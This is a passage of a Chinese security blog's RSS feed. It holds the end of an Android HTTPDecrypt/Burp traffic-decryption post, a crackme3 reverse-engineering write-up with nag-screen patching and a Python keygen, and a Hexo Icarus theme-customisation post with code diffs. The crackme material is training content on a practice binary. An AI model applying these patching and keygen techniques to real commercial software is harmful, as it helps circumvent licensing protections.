title="3.在burpsutie中进行设置"></a>3.在burpsutie中进行设置</h3><p>下载burp插件HTTPDecrpyt并进行安装</p><p><a href="https://github.com/lyxhh/lxhToolHTTPDecrypt/releases">https://github.com/lyxhh/lxhToolHTTPDecrypt/releases</a></p><p>选择到encrypt 然后右键发送到toBurp模块</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229150805594.png" alt="image-20201229150805594"></p><p>选择加密后的数据 然后根据配置的方法进行解密</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229150956317.png" alt="image-20201229150956317"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229151136475.png" alt="image-20201229151136475"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.ironheart.top/index.php/archives/22/">http://www.ironheart.top/index.php/archives/22/</a></p><p><a href="https://xz.aliyun.com/t/7130">https://xz.aliyun.com/t/7130</a></p><p><a href="https://www.t00ls.net/articles-51070.html#tls4">https://www.t00ls.net/articles-51070.html#tls4</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;本机环境&quot;&gt;&lt;a href=&quot;#本机环境&quot; class=&quot;headerlink&quot; title=&quot;本机环境&quot;&gt;&lt;/a&gt;本机环境&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
      
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ol4three.com/categories/Android/"/>
    
    
      <category term="Httpdecrypt" scheme="http://www.ol4three.com/tags/Httpdecrypt/"/>
    
  </entry>
  
  <entry>
    <title>crackme-系列之-crackme3</title>
    <link href="http://www.ol4three.com/2020/12/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme3/"/>
    <id>http://www.ol4three.com/2020/12/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme3/</id>
    <published>2020-12-28T08:00:24.000Z</published>
    <updated>2020-12-29T07:27:25.985Z</updated>
    
    <content type="html"><![CDATA[<h2 id="首先打开程序进行查看"><a href="#首先打开程序进行查看" class="headerlink" title="首先打开程序进行查看"></a>首先打开程序进行查看</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228160158599.png" alt="image-20201228160158599" style="zoom:50%;"><p>发现存在一个neg窗口</p><h2 id="去除neg窗口"><a href="#去除neg窗口" class="headerlink" title="去除neg窗口"></a>去除neg窗口</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>使用VBExploere把timer改为1 破解neg</p><p>根据提示框下断点进行分析</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>首先将内存定位到程序开始处0x401000</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228160748180.png" alt="image-20201228160748180"></p><p>搜索Timer，Timer是VB程序默认的定时器变量</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228160816008.png" alt="image-20201228160816008"></p><p>我们找到Timer之后 在上面的位置可以看到一个0x1B58，这个是计时器的秒数。也就是十进制的7000,7000毫秒就 是7秒。所以第一种去Neg的方法就是将0x1B58改为0x0001 但是此种方法也有一定的局限性，如果程序的作者将计时器的默认名称改掉之后 根本无法在内存中搜索到Timer关键 字 也就无法下手。下面介绍一种通用的解决方法</p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>Virtual Basic可执行程序结构研究 对于Visual Basic5/6编译生成的程序，不管自然编译还是伪编译，其程序入口点处的结构都是一样的。来到OEP处：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161030007.png" alt="image-20201228161030007"></p><p>指针0x4067D4指向的结构就是Virtual Basic程序的VBHeader结构，由此伸展开，整个VB程序的框架<strong>就在这了。 Virtual Basic程序框架结构</strong></p><p> 可能的Virtual Basic程序框架结构如图</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161100147.png" alt="image-20201228161100147"></p><p>TVBHeader结构定义</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161129407.png" alt="image-20201228161129407"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161203921.png" alt="image-20201228161203921"></p><p>AGUTTable(4C的位置)结构定义</p><p>以AfkayAs.2.exe为例说明：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161225305.png" alt="image-20201228161225305"></p><p>其对应每个字节的含义如下表</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161314880.png" alt="image-20201228161314880"></p><h2 id="4C法实战"><a href="#4C法实战" class="headerlink" title="4C法实战"></a>4C法实战</h2><p>在程序载入到入口点之后的第一个push也就是VBHeader的位置，数据窗口跟随。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161416594.png" alt="image-20201228161416594"></p><p>然后在数据窗口输入刚才的地址+4C，找到form GUI描述表的指针</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161433897.png" alt="image-20201228161433897"></p><p>数据窗口跟随DWORD</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161501143.png" alt="image-20201228161501143"></p><p>00  01 指的是窗体的序号 10则为第一个窗体的启动标志</p><p>所以 我们只要把第一个窗体数据块的00改成10 然后把第二个窗体的数据块的10改成00，或者将窗体的序号调换。即 可去除neg。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161703623.png" alt="image-20201228161703623"></p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161721626.png" alt="image-20201228161721626" style="zoom:50%;"><h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161902354.png" alt="image-20201228161902354"></p><p>和002一样获取哟弄个户名长度然后根据得到的结果算出来一个值 我这里这个值为355601</p><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161949962.png" alt="image-20201228161949962"></p><p>首先将刚才计算的结果转为浮点数 放入到FPU栈 然后将结果加上2.0 得到355603。逆向这个程序你并不需要 看懂每一条浮点指令，只需要单步跟踪 然后时时观察FPU栈的情况。</p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228162027293.png" alt="image-20201228162027293"></p><p>还是将刚才的结果转为浮点数并入栈 然后将355603乘以一个值再减去一个值 最后得到结果ST0=1066807.0000</p><h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228162141525.png" alt="image-20201228162141525"></p><p>将刚才那个值 -（-15） 到此验证结束</p><p>1066822</p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228162235299.png" alt="image-20201228162235299" style="zoom:50%;"><p>编写注册机</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228162444993.png" alt="image-20201228162444993"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228162502213.png" alt="image-20201228162502213"></p><h3 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(((ord(s[0])+len(s)*(0x15b38))+2)*3-2+15)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228162854781.png" alt="image-20201228162854781"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;please input your username :&quot;)</span><br><span class="line">s &#x3D; input()</span><br><span class="line"># 获取用户名长度*0x15b38 +  用户名首位</span><br><span class="line">print(ord(s[0])+len(s)*(0x15b38))</span><br><span class="line"># 变成浮点数然后数值加2</span><br><span class="line">print((ord(s[0])+len(s)*(0x15b38))+2)</span><br><span class="line"># 相应的浮点数 * 3 - 2</span><br><span class="line">print(((ord(s[0])+len(s)*(0x15b38))+2)*3-2)</span><br><span class="line">print(&quot;your password is:&quot;)</span><br><span class="line"># 让相应的值- (-15) 相当于+15</span><br><span class="line">print(((ord(s[0])+len(s)*(0x15b38))+2)*3-2+15)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;首先打开程序进行查看&quot;&gt;&lt;a href=&quot;#首先打开程序进行查看&quot; class=&quot;headerlink&quot; title=&quot;首先打开程序进行查看&quot;&gt;&lt;/a&gt;首先打开程序进行查看&lt;/h2&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://www.ol4three.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="crackme" scheme="http://www.ol4three.com/tags/crackme/"/>
    
  </entry>
  
  <entry>
    <title>Icarus 主题双列显示和目录单独浮动等</title>
    <link href="http://www.ol4three.com/2020/12/26/%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83/Icarus-%E4%B8%BB%E9%A2%98%E5%8F%8C%E5%88%97%E6%98%BE%E7%A4%BA%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8D%95%E7%8B%AC%E6%B5%AE%E5%8A%A8%E7%AD%89/"/>
    <id>http://www.ol4three.com/2020/12/26/%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83/Icarus-%E4%B8%BB%E9%A2%98%E5%8F%8C%E5%88%97%E6%98%BE%E7%A4%BA%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8D%95%E7%8B%AC%E6%B5%AE%E5%8A%A8%E7%AD%89/</id>
    <published>2020-12-25T17:18:06.000Z</published>
    <updated>2020-12-25T17:23:58.417Z</updated>
    
    <content type="html"><![CDATA[<p>本文是基于icarus 4.x的版本</p><p>本博客所选取的主题是 <a href="https://github.com/AlphaLxy/hexo-theme-icarus">Icarus</a> ，并做了一些个性化的修改，很多修改都可以直观的看到。详细的差异可以查看 <a href="https://github.com/ppoffice/hexo-theme-icarus/compare/4.1.1...AlphaLxy:master">diff</a>，这里记录一些主要的改动。</p><h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><h3 id="文章页面两栏布局"><a href="#文章页面两栏布局" class="headerlink" title="文章页面两栏布局"></a>文章页面两栏布局</h3><p>主题默认是三栏布局，在阅读文章时显得有些拥挤。可以通过配置的方式把所有文章变为两栏布局，在<code>_config.post.yml</code>把需要的<code>widget</code>显示在一边即可，可以参考<a href="https://blog.zhangruipeng.me/hexo-theme-icarus/Configuration/icarus用户指南-主题配置/#布局配置文件">官方文档</a>。</p><p>但两栏整体宽度跟三栏不同，因此强制指定为三栏布局，并且修改相应的宽度，这样所有的页面侧边栏宽度保持一致。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">diff:layout&#x2F;layout.jsx</span><br><span class="line"></span><br><span class="line">             &lt;Head site&#x3D;&#123;site&#125; config&#x3D;&#123;config&#125; helper&#x3D;&#123;helper&#125; page&#x3D;&#123;page&#125; &#x2F;&gt;</span><br><span class="line">-            &lt;body class&#x3D;&#123;&#96;is-$&#123;columnCount&#125;-column&#96;&#125;&gt;</span><br><span class="line">+            &lt;body class&#x3D;&#123;&#96;is-3-column&#96;&#125;&gt;</span><br><span class="line">                 &lt;Navbar config&#x3D;&#123;config&#125; helper&#x3D;&#123;helper&#125; page&#x3D;&#123;page&#125; &#x2F;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">diff:layout&#x2F;layout.jsx</span><br><span class="line"></span><br><span class="line">                                 &#39;is-12&#39;: columnCount &#x3D;&#x3D;&#x3D; 1,</span><br><span class="line">-                                &#39;is-8-tablet is-8-desktop is-8-widescreen&#39;: columnCount &#x3D;&#x3D;&#x3D; 2,</span><br><span class="line">+                                &#39;is-8-tablet is-8-desktop is-9-widescreen&#39;: columnCount &#x3D;&#x3D;&#x3D; 2,</span><br><span class="line">                                 &#39;is-8-tablet is-8-desktop is-6-widescreen&#39;: columnCount &#x3D;&#x3D;&#x3D; 3</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">diff:layout&#x2F;common&#x2F;widgets.jsx</span><br><span class="line"></span><br><span class="line"> function getColumnSizeClass(columnCount) &#123;</span><br><span class="line">     switch (columnCount) &#123;</span><br><span class="line">         case 2:</span><br><span class="line">-            return &#39;is-4-tablet is-4-desktop is-4-widescreen&#39;;</span><br><span class="line">+            return &#39;is-4-tablet is-4-desktop is-3-widescreen&#39;;</span><br><span class="line">         case 3:</span><br><span class="line">             return &#39;is-4-tablet is-4-desktop is-3-widescreen&#39;;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>并优化在不同屏幕小大下的宽度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">diff:include&#x2F;style&#x2F;responsive.styl</span><br><span class="line"></span><br><span class="line"> +widescreen()</span><br><span class="line">+    .is-3-column .container</span><br><span class="line">+        max-width: $widescreen - $gap</span><br><span class="line">+        width: $widescreen - $gap</span><br><span class="line">+</span><br><span class="line">     .is-1-column .container, .is-2-column .container</span><br><span class="line">         max-width: $desktop - 2 * $gap</span><br><span class="line">         width: $desktop - 2 * $gap</span><br><span class="line"></span><br><span class="line"> +fullhd()</span><br><span class="line">+    .is-3-column .container</span><br><span class="line">+        max-width: $fullhd - 2 * $gap</span><br><span class="line">+        width: $fullhd - 2 * $gap</span><br><span class="line">+</span><br><span class="line">     .is-2-column .container</span><br><span class="line">         max-width: $widescreen - 2 * $gap</span><br><span class="line">         width: $widescreen - 2 * $gap</span><br></pre></td></tr></table></figure><h3 id="优化文章标题布局"><a href="#优化文章标题布局" class="headerlink" title="优化文章标题布局"></a>优化文章标题布局</h3><p>标题移动到文章信息上方，增加更新时间，并增加了icon</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">diff:layout&#x2F;common&#x2F;article.jsx</span><br><span class="line"></span><br><span class="line">                 &#123;&#x2F;* Metadata *&#x2F;&#125;</span><br><span class="line">                 &lt;article class&#x3D;&#123;&#96;card-content article$&#123;&#39;direction&#39; in page ? &#39; &#39; + page.direction : &#39;&#39;&#125;&#96;&#125; role&#x3D;&quot;article&quot;&gt;</span><br><span class="line">+                    &#123;&#x2F;* Title *&#x2F;&#125;</span><br><span class="line">+                    &lt;h1 className&#x3D;&quot;title is-size-3 is-size-4-mobile has-text-weight-normal&quot;&gt;</span><br><span class="line">+                        &#123;index ?</span><br><span class="line">+                            &lt;a className&#x3D;&quot;has-link-black-ter&quot; href&#x3D;&#123;url_for(page.link || page.path)&#125;&gt;</span><br><span class="line">+                                &lt;i className&#x3D;&quot;fas fa-angle-double-right&quot;&gt;&lt;&#x2F;i&gt;&#123;page.title&#125;</span><br><span class="line">+                            &lt;&#x2F;a&gt; :</span><br><span class="line">+                            [&lt;i className&#x3D;&quot;fas fa-angle-double-right&quot;&gt;&lt;&#x2F;i&gt;, page.title]</span><br><span class="line">+                        &#125;</span><br><span class="line">+                    &lt;&#x2F;h1&gt;</span><br><span class="line">                     &#123;page.layout !&#x3D;&#x3D; &#39;page&#39; ? &lt;div class&#x3D;&quot;article-meta is-size-7 is-uppercase level is-mobile&quot;&gt;</span><br><span class="line">                         &lt;div class&#x3D;&quot;level-left&quot;&gt;</span><br><span class="line">                             &#123;&#x2F;* Creation Date *&#x2F;&#125;</span><br><span class="line">-                            &#123;page.date &amp;&amp; &lt;span class&#x3D;&quot;level-item&quot; dangerouslySetInnerHTML&#x3D;&#123;&#123;</span><br><span class="line">-                                __html: _p(&#39;article.created_at&#39;, &#96;&lt;time dateTime&#x3D;&quot;$&#123;date_xml(page.date)&#125;&quot; title&#x3D;&quot;$&#123;date_xml(page.date)&#125;&quot;&gt;$&#123;date(page.date)&#125;&lt;&#x2F;time&gt;&#96;)</span><br><span class="line">-                            &#125;&#125;&gt;&lt;&#x2F;span&gt;&#125;</span><br><span class="line">+                            &#123;page.date &amp;&amp; &lt;span class&#x3D;&quot;level-item&quot;&gt;</span><br><span class="line">+                                &lt;i className&#x3D;&quot;far fa-calendar-alt&quot;&gt;&amp;nbsp;&lt;&#x2F;i&gt;</span><br><span class="line">+                                &lt;time dateTime&#x3D;&quot;$&#123;date_xml(page.date)&#125;&quot; title&#x3D;&quot;$&#123;date_xml(page.date)&#125;&quot;&gt;&#123;date(page.date)&#125;&lt;&#x2F;time&gt;</span><br><span class="line">+                            &lt;&#x2F;span&gt;&#125;</span><br><span class="line">                             &#123;&#x2F;* Last Update Date *&#x2F;&#125;</span><br><span class="line">-                            &#123;page.updated &amp;&amp; &lt;span class&#x3D;&quot;level-item&quot; dangerouslySetInnerHTML&#x3D;&#123;&#123;</span><br><span class="line">-                                __html: _p(&#39;article.updated_at&#39;, &#96;&lt;time dateTime&#x3D;&quot;$&#123;date_xml(page.updated)&#125;&quot; title&#x3D;&quot;$&#123;date_xml(page.updated)&#125;&quot;&gt;$&#123;date(page.updated)&#125;&lt;&#x2F;time&gt;&#96;)</span><br><span class="line">-                            &#125;&#125;&gt;&lt;&#x2F;span&gt;&#125;</span><br><span class="line">+                            &#123;page.updated &amp;&amp; &lt;span class&#x3D;&quot;level-item is-hidden-mobile&quot;&gt;</span><br><span class="line">+                                &lt;i class&#x3D;&quot;far fa-calendar-check&quot;&gt;&amp;nbsp;&lt;&#x2F;i&gt;</span><br><span class="line">+                                &lt;time dateTime&#x3D;&quot;$&#123;date_xml(page.updated)&#125;&quot; title&#x3D;&quot;$&#123;date_xml(page.updated)&#125;&quot;&gt;&#123;date(page.updated)&#125;&lt;&#x2F;time&gt;</span><br><span class="line">+                            &lt;&#x2F;span&gt;&#125;</span><br><span class="line">                             &#123;&#x2F;* author *&#x2F;&#125;</span><br><span class="line">                             &#123;page.author ? &lt;span class&#x3D;&quot;level-item&quot;&gt; &#123;page.author&#125; &lt;&#x2F;span&gt; : null&#125;</span><br></pre></td></tr></table></figure><p>其中时间直接使用日期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">diff:source&#x2F;js&#x2F;main.js</span><br><span class="line"></span><br><span class="line">-    if (typeof moment &#x3D;&#x3D;&#x3D; &#39;function&#39;) &#123;</span><br><span class="line">-        $(&#39;.article-meta time&#39;).each(function() &#123;</span><br><span class="line">-            $(this).text(moment($(this).attr(&#39;datetime&#39;)).fromNow());</span><br><span class="line">-        &#125;);</span><br><span class="line">-    &#125;</span><br></pre></td></tr></table></figure><h3 id="优化文章结尾布局"><a href="#优化文章结尾布局" class="headerlink" title="优化文章结尾布局"></a>优化文章结尾布局</h3><p>在文章结尾增加一个 <code>hr</code>，并修改 <code>tags</code> 展示。在预览时（主页）也显示 <code>tags</code>，并且将 <code>Read More</code> 按钮放置在右边。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">diff:layout&#x2F;common&#x2F;article.jsx</span><br><span class="line"></span><br><span class="line">                     &#123;&#x2F;* Licensing block *&#x2F;&#125;</span><br><span class="line">                     &#123;!index &amp;&amp; article &amp;&amp; article.licenses &amp;&amp; Object.keys(article.licenses)</span><br><span class="line">                         ? &lt;ArticleLicensing.Cacheable page&#x3D;&#123;page&#125; config&#x3D;&#123;config&#125; helper&#x3D;&#123;helper&#125; &#x2F;&gt; : null&#125;</span><br><span class="line">+                    &lt;hr style&#x3D;&quot;height:1px;margin:1rem 0&quot;&#x2F;&gt;</span><br><span class="line">+                    &lt;div className&#x3D;&quot;level is-mobile is-flex&quot;&gt;</span><br><span class="line">                     &#123;&#x2F;* Tags *&#x2F;&#125;</span><br><span class="line">-                    &#123;!index &amp;&amp; page.tags &amp;&amp; page.tags.length ? &lt;div class&#x3D;&quot;article-tags is-size-7 mb-4&quot;&gt;</span><br><span class="line">-                        &lt;span class&#x3D;&quot;mr-2&quot;&gt;#&lt;&#x2F;span&gt;</span><br><span class="line">-                        &#123;page.tags.map(tag &#x3D;&gt; &#123;</span><br><span class="line">-                            return &lt;a class&#x3D;&quot;link-muted mr-2&quot; rel&#x3D;&quot;tag&quot; href&#x3D;&#123;url_for(tag.path)&#125;&gt;&#123;tag.name&#125;&lt;&#x2F;a&gt;;</span><br><span class="line">+                    &#123;page.tags &amp;&amp; page.tags.length ? &lt;div class&#x3D;&quot;article-tags is-size-7 is-uppercase&quot;&gt;</span><br><span class="line">+                        &lt;i class&#x3D;&quot;fas fa-tags has-text-grey&quot;&gt;&lt;&#x2F;i&gt;&amp;nbsp;</span><br><span class="line">+                        &#123;page.tags.map((tag, index) &#x3D;&gt; &#123;</span><br><span class="line">+                            return &lt;a class&#x3D;&quot;link-muted&quot; rel&#x3D;&quot;tag&quot; href&#x3D;&#123;url_for(tag.path)&#125;&gt;&#123;tag.name&#125;&#123;index !&#x3D;&#x3D; page.tags.length-1? &#39;, &#39;:&#39;&#39;&#125;&lt;&#x2F;a&gt;;</span><br><span class="line">                         &#125;)&#125;</span><br><span class="line">                     &lt;&#x2F;div&gt; : null&#125;</span><br><span class="line">                     &#123;&#x2F;* &quot;Read more&quot; button *&#x2F;&#125;</span><br><span class="line">-                    &#123;index &amp;&amp; page.excerpt ? &lt;a class&#x3D;&quot;article-more button is-small is-size-7&quot; href&#x3D;&#123;&#96;$&#123;url_for(page.link || page.path)&#125;#more&#96;&#125;&gt;&#123;__(&#39;article.more&#39;)&#125;&lt;&#x2F;a&gt; : null&#125;</span><br><span class="line">+                    &#123;index &amp;&amp; page.excerpt ? &lt;a class&#x3D;&quot;article-more button is-small is-size-7&quot; href&#x3D;&#123;&#96;$&#123;url_for(page.link || page.path)&#125;#more&#96;&#125;&gt;&lt;i class&#x3D;&quot;fas fa-book-reader has-text-grey&quot;&gt;&lt;&#x2F;i&gt;&amp;nbsp;&amp;nbsp;&#123;__(&#39;article.more&#39;)&#125;&lt;&#x2F;a&gt; : null&#125;</span><br><span class="line">+                    &lt;&#x2F;div&gt;</span><br><span class="line">                     &#123;&#x2F;* Share button *&#x2F;&#125;</span><br></pre></td></tr></table></figure><h3 id="优化个人信息布局"><a href="#优化个人信息布局" class="headerlink" title="优化个人信息布局"></a>优化个人信息布局</h3><p>减少头像大小，头像下方计数的地方增加链接，follow前增加icon。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">diff:layout&#x2F;widget&#x2F;profile.jsx</span><br><span class="line"></span><br><span class="line">-                    &lt;div class&#x3D;&quot;level-item has-text-centered is-marginless&quot;&gt;</span><br><span class="line">+                    &lt;a class&#x3D;&quot;level-item has-text-centered is-marginless&quot; href&#x3D;&#123;counter.category.url&#125;&gt;</span><br><span class="line">                         &lt;div&gt;</span><br><span class="line">                             &lt;p class&#x3D;&quot;heading&quot;&gt;&#123;counter.category.title&#125;&lt;&#x2F;p&gt;</span><br><span class="line">-                            &lt;a href&#x3D;&#123;counter.category.url&#125;&gt;</span><br><span class="line">+                            &lt;div&gt;</span><br><span class="line">                                 &lt;p class&#x3D;&quot;title&quot;&gt;&#123;counter.category.count&#125;&lt;&#x2F;p&gt;</span><br><span class="line">-                            &lt;&#x2F;a&gt;</span><br><span class="line">+                            &lt;&#x2F;div&gt;</span><br><span class="line">                         &lt;&#x2F;div&gt;</span><br><span class="line">-                    &lt;&#x2F;div&gt;</span><br><span class="line">+                    &lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><h3 id="优化移动端显示"><a href="#优化移动端显示" class="headerlink" title="优化移动端显示"></a>优化移动端显示</h3><p>在移动端，隐藏 <code>archive</code> 和 <code>tags</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">diff:source&#x2F;js&#x2F;main.js</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">+</span><br><span class="line">+    $(&#39;div.container div.card[data-type&#x3D;tags]&#39;).addClass(&#39;is-hidden-mobile&#39;);</span><br><span class="line">+    $(&#39;div.container div.card[data-type&#x3D;archives]&#39;).addClass(&#39;is-hidden-mobile&#39;);</span><br><span class="line"> &#125;(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings));</span><br></pre></td></tr></table></figure><h3 id="目录粘性定位"><a href="#目录粘性定位" class="headerlink" title="目录粘性定位"></a>目录粘性定位</h3><p>原来只支持侧边栏整体粘性定位，为了阅读体验，只针对目录开启粘性定位，增加 <code>column-left is-sticky</code> 类，并调整样式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">diff:source&#x2F;js&#x2F;main.js</span><br><span class="line"></span><br><span class="line">     if ($toc.length &gt; 0) &#123;</span><br><span class="line">+        $toc.addClass(&#39;column-left is-sticky&#39;);</span><br><span class="line">         const $mask &#x3D; $(&#39;&lt;div&gt;&#39;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">diff:include&#x2F;style&#x2F;article.styl</span><br><span class="line">+#toc</span><br><span class="line">+    max-height: calc(100vh - 22px)</span><br><span class="line">+    overflow-y: scroll</span><br></pre></td></tr></table></figure><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><h3 id="增加许可协议"><a href="#增加许可协议" class="headerlink" title="增加许可协议"></a>增加许可协议</h3><p>新版已经支持许可协议，直接配置即可，参考<a href="https://blog.zhangruipeng.me/hexo-theme-icarus/Configuration/icarus用户指南-主题配置/#文章许可协议">官方文档</a>。</p><h3 id="增加标题自动计数"><a 